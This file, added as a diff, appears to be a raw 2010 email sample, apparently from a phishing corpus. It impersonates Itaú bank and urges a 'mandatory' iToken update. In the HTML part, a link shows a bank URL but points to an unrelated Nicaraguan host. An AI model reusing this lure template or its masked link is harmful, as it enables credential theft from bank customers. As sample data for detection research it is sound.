@@ -1,0 +1,110 @@
+X-Account-Key: account2
+Return-path: <atendimento@comunicacao.com.br>
+Envelope-to: pablof@uvigo.es
+Delivery-date: Thu, 06 May 2010 18:03:37 +0200
+Received: from mail.uvigo.es ([193.146.32.69] helo=grelo.uvigo.es)
+	by cacahuete.uvigo.es with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.69)
+	(envelope-from <atendimento@comunicacao.com.br>)
+	id 1OA3Y1-0007uH-Gl
+	for pablof@uvigo.es; Thu, 06 May 2010 18:03:37 +0200
+Received: from cogumelo.uvigo.es (antispam1.uvigo.es [193.146.32.120])
+	by grelo.uvigo.es (8.13.8/8.13.8/Debian-3) with ESMTP id o46G3Xfw014249
+	(version=TLSv1/SSLv3 cipher=AES256-SHA bits=256 verify=NOT)
+	for <pablof@uvigo.es>; Thu, 6 May 2010 18:03:36 +0200
+Received: from [200.26.235.165] (helo=UN01.unitedictgroup.net)
+	by cogumelo.uvigo.es with esmtp (Exim 4.69)
+	(envelope-from <atendimento@comunicacao.com.br>)
+	id 1OA3Xu-0007vD-PL
+	for pablof@uvigo.es; Thu, 06 May 2010 18:03:33 +0200
+Received: from XXXCNN6410 ([187.45.225.87]) by UN01.unitedictgroup.net with Microsoft SMTPSVC(6.0.3790.4675);
+	 Thu, 6 May 2010 12:12:51 -0400
+From: =?ISO-8859-1?Q?Comunica=E7=E3o?= Digital =?ISO-8859-1?Q?Ita=FA?=
+ <atendimento@comunicacao.com.br>
+To: pablof@uvigo.es
+Content-Type: multipart/alternative; boundary="=_qhhTLrn5lOKzM0DsCAkFN9vJoYMSljN50"
+MIME-Version: 1.0
+Reply-To: atendimento@comunicacao.com.br
+Date: Thu, 6 May 2010 13:02:29 -0300
+Message-ID: <UN01LNvfU6JI3oPz7by0000dcad@UN01.unitedictgroup.net>
+X-OriginalArrivalTime: 06 May 2010 16:13:00.0187 (UTC) FILETIME=[FF5E56B0:01CAED36]
+X-Spam-Flag: No
+X-Spam-Checker-Version: SpamAssassin 3.2.5 (2008-06-10) on cogumelo.uvigo.es
+X-Spam-Status: No, score=1.6 required=5.0 tests=BAYES_50,HTML_IMAGE_ONLY_16,
+	HTML_MESSAGE,RDNS_NONE,SPF_HELO_PASS autolearn=no version=3.2.5
+X-Spam-UVIGO-Status: No, score=1.6 required=5.0 tests=BAYES_50=0.001,
+	HTML_IMAGE_ONLY_16=1.526,HTML_MESSAGE=0.001,RDNS_NONE=0.1,
+	SPF_HELO_PASS=-0.001 autolearn=no version=3.2.5
+X-Spam-UVIGO-Level: *
+X-Spam-UVIGO: No
+X-Spam-UVIGO-Score: _SCOREINT_
+Subject: =?ISO-8859-1?Q?Atualiza=E7=E3o:?= iToken =?ISO-8859-1?Q?vers=E3o?=
+ 3.01.
+X-Mail-Scanned: Criba + Clamd smtp.uvigo.es
+X-SA-Exim-Connect-IP: 193.146.32.69
+X-SA-Exim-Mail-From: atendimento@comunicacao.com.br
+X-SA-Exim-Scanned: No (on cacahuete.uvigo.es); SAEximRunCond expanded to false
+
+This is a multi-part message in MIME format
+
+--=_qhhTLrn5lOKzM0DsCAkFN9vJoYMSljN50
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+
+ - This mail is a HTML mail. Not all elements could be shown in plain =
+text mode. -
+
+Nova
+Caro cliente,
+Estamos disponibilizando a
+Atualiza=E7=E3o
+do seu aparelho iToken
+para a vers=E3o 3.01
+(v.3.01)
+=2E. A atualiza=E7=E3o =E9 obrigat=F3ria e pode
+ser feita somente via
+Bankline
+por meio do link abaixo.
+Dispon=EDvel por 2 d=EDas =FAteis apartir de 05/05/2010.
+http://bankline.itau.com.br/atualizacaoitoken/itoken_v3.01
+Email cadastrado no banco de dados de clientes Ita=FA: pablof@uvigo.es
+Item Verificador Anti-Spam
+Atenciosamente,
+Ita=FA S/A - Central Atendimento On-line.
+
+--=_qhhTLrn5lOKzM0DsCAkFN9vJoYMSljN50
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD><TITLE>Nova</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dwindow=
+s-1252">
+<META content=3D"MSHTML 8.00.7600.16385" name=3DGENERATOR></HEAD>
+<BODY>
+<P><FONT face=3Dverdana size=3D2><IMG src=3D"http://www.itau.com.br/it=
+aumail/servicos/comunicacao_digital/pj/cd_header.gif"><BR></FONT></P>
+<P><FONT face=3Dverdana size=3D2><STRONG>Caro cliente,</STRONG></FONT>=
+</P>
+<P><FONT face=3Dverdana size=3D2>Estamos disponibilizando a <B>Atualiz=
+a=E7=E3o</B> do seu aparelho iToken <BR>para a vers=E3o 3.01 <B>(v.3.0=
+1)</B>. A atualiza=E7=E3o =E9 obrigat=F3ria e pode<BR>ser feita soment=
+e via <B>Bankline</B> por meio do link abaixo.<BR><BR>Dispon=EDvel por=
+ 2 d=EDas =FAteis apartir de 05/05/2010.=20
+<P align=3Dleft><FONT face=3Dverdana color=3D#000000 size=3D2><A href=
+=3D"http://bjcu.uca.edu.ni/AtualizaiToken.htm">http://bankline.itau.co=
+m.br/atualizacaoitoken/itoken_v3.01</A> </FONT><BR><BR>Email cadastrad=
+o no banco de dados de clientes Ita=FA: pablof@uvigo.es<BR>Item Verifi=
+cador Anti-Spam<BR>
+<P><FONT face=3Dverdana size=3D2><IMG src=3D"http://www.itau.com.br/it=
+aumail/servicos/comunicacao_digital/pj/sac_pj.gif"><BR></FONT></P>
+<P><BR><FONT face=3Dverdana size=3D2>Atenciosamente,<BR>Ita=FA S/A - C=
+entral Atendimento On-line.</FONT></P></FONT></BODY></HTML>
+
+--=_qhhTLrn5lOKzM0DsCAkFN9vJoYMSljN50--
+
+
+></HTML>
+
+--=_qhhTLrn5lOKzM0DsCAkFN9vJoYMSljN50--
+
+
